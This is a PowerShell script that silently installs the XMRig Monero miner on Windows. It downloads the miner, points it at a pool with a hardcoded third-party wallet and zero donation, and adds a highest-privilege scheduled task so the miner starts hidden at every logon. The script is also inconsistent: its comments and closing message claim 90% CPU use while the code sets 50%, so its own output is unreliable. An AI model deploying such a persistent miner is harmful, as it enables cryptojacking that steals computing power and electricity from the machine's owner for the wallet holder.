# XMRig Installer for Windows - 50% CPU - Startup Enabled
# Run this as Administrator in PowerShell

# 1. Show ASCII Logo
@"

 /$$   /$$  /$$$$$$                /$$            
| $$  | $$ /$$__  $$              | $$            
| $$  | $$| $$  \ $$      /$$$$$$$| $$$$$$$       
| $$$$$$$$| $$$$$$$$     /$$_____/| $$__  $$      
| $$__  $$| $$__  $$    |  $$$$$$ | $$  \ $$      
| $$  | $$| $$  | $$     \____  $$| $$  | $$      
| $$  | $$| $$  | $$ /$$ /$$$$$$$/| $$  | $$      
|__/  |__/|__/  |__/|__/|_______/ |__/  |__/      
                                                  
 
"@ | Write-Host -ForegroundColor Cyan

# 2. Variables
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-msvc-win64.zip"
$downloadPath = "$env:USERPROFILE\Downloads\xmrig.zip"
$installPath = "$env:USERPROFILE\xmrig"
$configPath = "$installPath\config.json"
$xmrigExe = "$installPath\xmrig.exe"

# 3. Download and Extract XMRig
Invoke-WebRequest -Uri $xmrigUrl -OutFile $downloadPath
Expand-Archive -Path $downloadPath -DestinationPath $installPath -Force

# 4. Get CPU Threads and Set 90%
$cpuThreads = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors
$usedThreads = [math]::Max(1, [math]::Floor($cpuThreads * 0.5))

# 5. Create Config File
$config = @"
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 1.0,
    "huge-pages": false,
    "threads": $usedThreads
  },
  "donate-level": 0,
  "pools": [
    {
      "url": "gulf.moneroocean.stream:10128",
      "user": "41jDs7aYqSFYpyvSBs7JAzSpRCjL9sSCS9WPuVGRukYcYTtUTszDdp71RFVtWD2icADwsnAQoSBJfDm7J1Chsuou5AHG36P",
      "pass": "x",
      "rig-id": "Windows-50-W001",
      "keepalive": true,
      "tls": false
    }
  ]
}
"@
$config | Out-File -Encoding ascii -FilePath $configPath

# 6. Set XMRig to run at login via Task Scheduler
$taskName = "XMRigMiner"
$action = New-ScheduledTaskAction -Execute $xmrigExe -Argument "-c `"$configPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force

# 7. Start XMRig Immediately
Start-Process -FilePath $xmrigExe -ArgumentList "-c `"$configPath`""

Write-Host "`n✅ XMRig is installed and running at 90% CPU."
Write-Host "🔁 It will auto-start at login in the background."
Write-Host "📁 Install Path: $installPath"
